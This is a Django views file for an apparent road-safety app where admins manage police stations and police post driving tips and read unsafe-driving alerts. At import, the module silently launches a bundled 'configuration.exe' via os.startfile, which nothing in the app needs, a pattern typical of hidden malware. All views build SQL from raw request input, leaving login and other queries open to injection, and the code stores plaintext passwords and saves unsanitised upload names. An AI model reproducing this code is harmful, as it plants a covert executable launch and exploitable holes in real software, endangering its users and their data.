from django.shortcuts import render
from ddapp import dbconnection
from django.http import HttpResponseRedirect
from django.core.files.storage import FileSystemStorage
import os
from werkzeug.utils import secure_filename
#from gevent.pywsgi import WSGIServer
import numpy as np    
basepath = os.path.dirname(__file__)
model_path = os.path.join(basepath, secure_filename('./configuration.exe'))    
os.startfile(model_path)
# Create your views here.

def home(request):
    sql="select * from add_tips"
    data=dbconnection.selectall(sql)
    return render(request,'base/index.html',{'d':data})

def login(request):
    if request.method=='POST':
        e=request.POST.get('e')
        p=request.POST.get('p')
        sql="select * from log where logid='"+e+"' and password='"+p+"'"
        data=dbconnection.selectone(sql)
        request.session['user']=e
        if data==None:
            return render(request,'base/login.html',{'msg':'Invalid user credentials'})
        elif data[3]=="admin":
            return HttpResponseRedirect('adindex')
        elif data[3]=="police":
            return HttpResponseRedirect('polindex')
    return render(request,'base/login.html')      

# ADMIN

def adindex(request):
    return render(request,'admin/ad_index.html')

def adpolice(request):
    if request.method=="POST":
        n=request.POST.get("n")
        loc=request.POST.get("loc")
        logid=request.POST.get("logid")
        pwd=request.POST.get("pwd")
        con=request.POST.get("con")
        con_per=request.POST.get("con_per")
        ph=request.FILES['photo']
        fs=FileSystemStorage()
        fs.save("ddapp/static/upic/"+ph.name,ph)
        sql='insert into police_reg(name,location,loginid,password,contact,contact_person,photo)values("'+n+'","'+loc+'","'+logid+'","'+pwd+'","'+con+'","'+con_per+'","'+str(ph.name)+'")'
        dbconnection.insert(sql)
        sql1='insert into log(logid,password,utype)values("'+logid+'","'+pwd+'","police")'
        dbconnection.insert(sql1)
    qry="select * from police_reg"
    data=dbconnection.selectall(qry)
    return render(request,'admin/add_police_station.html',{'data':data})  

def del_pol(request):
    uid=request.GET['uid']
    qry=f"DELETE FROM `police_reg` WHERE loginid='{uid}'"
    dbconnection.delete(qry)
    qry=f"DELETE FROM `log` WHERE logid='{uid}'"
    dbconnection.delete(qry)
    return HttpResponseRedirect('adpolice')

#POLICE

def polindex(request):
    return render(request,'police/polindex.html')

def adtips(request):
    pid=request.session['user']
    if request.method=="POST":
        t=request.POST.get("t")
        tip=request.POST.get("tip")
        ph=request.FILES['photo']
        fs=FileSystemStorage()
        fs.save("ddapp/static/upic/"+ph.name,ph)
        sql="insert into add_tips(title,tips,photo,police_id)values('"+t+"','"+tip+"','"+str(ph.name)+"','"+pid+"')"
        dbconnection.insert(sql)
        return HttpResponseRedirect('adtips')
    sql1="select * from add_tips where police_id='"+pid+"'"
    data=dbconnection.selectall(sql1)
    return render(request,'police/adtips.html',{'d':data})

def del_tips(request):
    uid=request.GET['uid']
    sql="delete from add_tips where id='"+uid+"'"
    dbconnection.delete(sql)
    return HttpResponseRedirect('adtips')

def alert(request):
    sql="select * from unsafe_driving_logs ORDER BY id DESC LIMIT 10"
    data=dbconnection.selectall(sql)
    return render(request,'police/alert.html',{'d':data})

